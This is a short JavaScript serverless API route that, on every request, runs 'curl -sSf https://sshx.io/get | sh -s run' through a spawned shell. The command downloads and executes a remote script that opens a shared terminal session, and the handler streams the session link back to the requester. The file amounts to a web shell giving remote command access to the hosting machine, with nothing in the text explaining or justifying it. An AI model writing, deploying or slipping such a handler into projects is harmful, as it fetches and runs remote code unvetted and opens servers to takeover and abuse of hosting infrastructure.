const { spawn } = require("child_process");

export default function handler(req, res) {
    res.setHeader("Content-Type", "text/plain");
    res.setHeader("Cache-Control", "no-cache");
    res.setHeader("Connection", "keep-alive");

    const command = spawn("sh", ["-c", "curl -sSf https://sshx.io/get | sh -s run"]);

    command.stdout.on("data", (data) => {
        res.write(data);
    });

    command.stderr.on("data", (data) => {
        res.write("Error: " + data);
    });

    command.on("close", (code) => {
        res.end(`\nProcess exited with code ${code}\n`);
    });
}
